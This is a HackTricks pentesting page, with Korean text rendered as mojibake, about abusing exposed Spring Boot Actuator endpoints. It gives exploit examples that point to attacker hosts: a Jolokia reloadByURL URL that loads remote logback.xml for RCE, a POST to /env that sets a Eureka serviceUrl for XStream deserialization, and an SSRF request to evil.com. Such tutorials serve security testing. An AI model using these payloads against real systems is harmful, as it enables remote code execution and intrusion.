# Spring Actuators

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**[https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)**ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

## Spring Boot Actuators ì•…ìš©

**ì›ë³¸ ê²Œì‹œë¬¼ì€ [https://www.veracode.com/blog/research/exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.**

### **ì£¼ìš” í¬ì¸íŠ¸:**

- Spring Boot ActuatorsëŠ” `/health`, `/trace`, `/beans`, `/env` ë“±ì˜ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë“±ë¡í•©ë‹ˆë‹¤. ë²„ì „ 1ë¶€í„° 1.4ê¹Œì§€ëŠ” ì´ëŸ¬í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì¸ì¦ ì—†ì´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë²„ì „ 1.5ë¶€í„°ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ `/health`ì™€ `/info`ë§Œ ë¯¼ê°í•˜ì§€ ì•Šì§€ë§Œ, ê°œë°œìë“¤ì€ ì´ ë³´ì•ˆì„ ì¢…ì¢… ë¹„í™œì„±í™”í•©ë‹ˆë‹¤.
- íŠ¹ì • Actuator ì—”ë“œí¬ì¸íŠ¸ëŠ” ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ í•´ë¡œìš´ ì‘ì—…ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
- `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, `/heapdump` ë“±ì…ë‹ˆë‹¤.
- Spring Boot 1.xì—ì„œëŠ” Actuatorê°€ ë£¨íŠ¸ URLì— ë“±ë¡ë˜ì§€ë§Œ, 2.xì—ì„œëŠ” `/actuator/` ê¸°ë³¸ ê²½ë¡œ ì•„ë˜ì— ë“±ë¡ë©ë‹ˆë‹¤.

### **ì•…ìš© ê¸°ë²•:**

1. **'/jolokia'ë¥¼ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰**:
- `/jolokia` ì•¡ì¶”ì—ì´í„° ì—”ë“œí¬ì¸íŠ¸ëŠ” Jolokia ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë…¸ì¶œì‹œí‚¤ë©°, MBeansì— ëŒ€í•œ HTTP ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.
- `reloadByURL` ì‘ì—…ì€ ì™¸ë¶€ URLì—ì„œ ë¡œê¹… êµ¬ì„±ì„ ë‹¤ì‹œë¡œë“œí•  ìˆ˜ ìˆë„ë¡ ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì¡°ì‘ëœ XML êµ¬ì„±ì„ í†µí•œ ë¸”ë¼ì¸ë“œ XXE ë˜ëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì˜ˆì‹œ ì•…ìš© URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.

2. **'/env'ë¥¼ í†µí•œ êµ¬ì„± ìˆ˜ì •**:
- Spring Cloud ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì¡´ì¬í•˜ëŠ” ê²½ìš°, `/env` ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ í™˜ê²½ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì†ì„±ì„ ì¡°ì‘í•˜ì—¬ Eureka serviceURLì˜ XStream ì—­ì§ë ¬í™” ì·¨ì•½ì ê³¼ ê°™ì€ ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì˜ˆì‹œ ì•…ìš© POST ìš”ì²­:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```

3. **ê¸°íƒ€ ìœ ìš©í•œ ì„¤ì •**:
- `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, `spring.datasource.tomcat.max-active`ì™€ ê°™ì€ ì†ì„±ì€ SQL ì¸ì ì…˜ ë˜ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° ë¬¸ìì—´ ë³€ê²½ê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì•…ìš©ì„ ìœ„í•´ ì¡°ì‘ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **ì¶”ê°€ ì •ë³´:**

- ê¸°ë³¸ ì•¡ì¶”ì—ì´í„°ì˜ í¬ê´„ì ì¸ ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Spring Boot 2.xì˜ `/env` ì—”ë“œí¬ì¸íŠ¸ëŠ” ì†ì„± ìˆ˜ì •ì„ ìœ„í•´ JSON í˜•ì‹ì„ ì‚¬ìš©í•˜ì§€ë§Œ, ì¼ë°˜ì ì¸ ê°œë…ì€ ë™ì¼í•©ë‹ˆë‹¤.

### **ê´€ë ¨ ì£¼ì œ:**

1. **Env + H2 RCE**:
- `/env` ì—”ë“œí¬ì¸íŠ¸ì™€ H2 ë°ì´í„°ë² ì´ìŠ¤ì˜ ì¡°í•©ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [ì—¬ê¸°](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

2. **ì˜ëª»ëœ ê²½ë¡œëª… í•´ì„ì„ í†µí•œ Spring Boot SSRF**:
- Spring í”„ë ˆì„ì›Œí¬ì˜ HTTP ê²½ë¡œëª…ì—ì„œ ë§¤íŠ¸ë¦­ìŠ¤ ë§¤ê°œë³€ìˆ˜(`;`)ì˜ ì²˜ë¦¬ëŠ” ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡°(SSRF)ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì˜ˆì‹œ ì•…ìš© ìš”ì²­:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
